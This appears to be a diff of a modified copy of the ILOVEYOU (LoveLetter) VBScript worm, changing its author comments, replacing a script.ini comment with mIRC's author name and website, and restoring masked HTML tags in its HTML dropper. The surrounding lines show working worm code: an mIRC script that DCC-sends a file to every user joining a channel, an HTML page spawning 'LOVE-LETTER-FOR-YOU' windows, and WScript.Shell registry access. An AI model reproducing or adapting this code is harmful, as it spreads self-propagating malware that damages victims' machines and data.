@@ -1,5 +1,5 @@
-rem  barok -loveletter(vbe) <i love you> 
-rem by: modified by 1001010 1101111 1101000 1101110 100000 1001101 1100101 1101100 1101111 1100100 1111001
+ rem  barok -loveletter(vbe) <I Love YOU> 
+ rem by: SOMEONE, I TOLD YOU I LOVE YOU , But you play me like psp
  On Error Resume Next 
  dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow 
  eq="" 
@@ -118,8 +118,8 @@ rem by: modified by 1001010 1101111 1101000 1101110 100000 1001101 1100101 11011
  scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will" 
  scriptini.WriteLine "    corrupt... WINDOWS will affect and will not run correctly. thanks" 
  scriptini.WriteLine ";" 
-               scriptini.WriteLine ";I love You" 
- scriptini.WriteLine ";" 
+ scriptini.WriteLine ";Khaled Mardam-Bey" 
+ scriptini.WriteLine ";http://www.mirc.com" 
  scriptini.WriteLine ";" 
  scriptini.WriteLine "n0=on 1:JOIN:#:{" 
  scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }" scriptini.WriteLine "n2=  /.dcc send $nick 
@@ -207,9 +207,9 @@ rem by: modified by 1001010 1101111 1101000 1101110 100000 1001101 1100101 11011
  sub html 
  On Error Resume Next 
  dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6 
- dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><**** NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - 
- LOVELETTER@-@>"&vbcrlf& _ "<**** NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? 
- @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _ "<**** NAME=@-@Description@-@ 
+ dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - 
+ LOVELETTER@-@>"&vbcrlf& _ "<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? 
+ @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _ "<META NAME=@-@Description@-@ 
  CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _ 
  "<?-?HEAD><BODY 
  ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU. 
@@ -241,7 +241,7 @@ rem by: modified by 1001010 1101111 1101000 1101110 100000 1001101 1100101 11011
  "aw=0"&vbcrlf& _ 
  "end if"&vbcrlf& _ 
  "if (aw=1) then"&vbcrlf& _ 
- "********.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _ "window.close"&vbcrlf& _ 
+ "document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _ "window.close"&vbcrlf& _ 
  "end if"&vbcrlf& _ 
  "end if"&vbcrlf& _ 
  "Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _ 
